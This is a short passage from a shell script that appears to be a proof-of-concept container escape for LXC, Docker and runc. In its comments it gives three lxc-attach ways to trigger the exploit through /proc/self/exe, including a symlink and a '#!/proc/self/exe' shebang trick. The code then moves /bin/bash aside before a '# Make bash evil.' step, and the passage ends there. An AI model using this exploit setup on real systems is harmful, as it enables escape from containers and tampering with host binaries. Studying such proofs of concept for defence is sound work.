# And finally add an entrypoint. You can exploit this any of the following
# ways:
#
#  1. lxc-attach -n c1 -- /proc/self/exe
#  2. lxc-attach -n c1 -- /bin/bad_bash (ln -sf /proc/self/exe /bin/bad_bash)
#  3. lxc-attach -n c1 -- /bin/bad_bash (echo '#!/proc/self/exe' > /bin/bad_bash)
#
# (Or the equivalent for Docker/runc, etc.)

# Keep around good_bash for debugging.
mv /bin/bash /bin/good_bash

# Make bash evil.
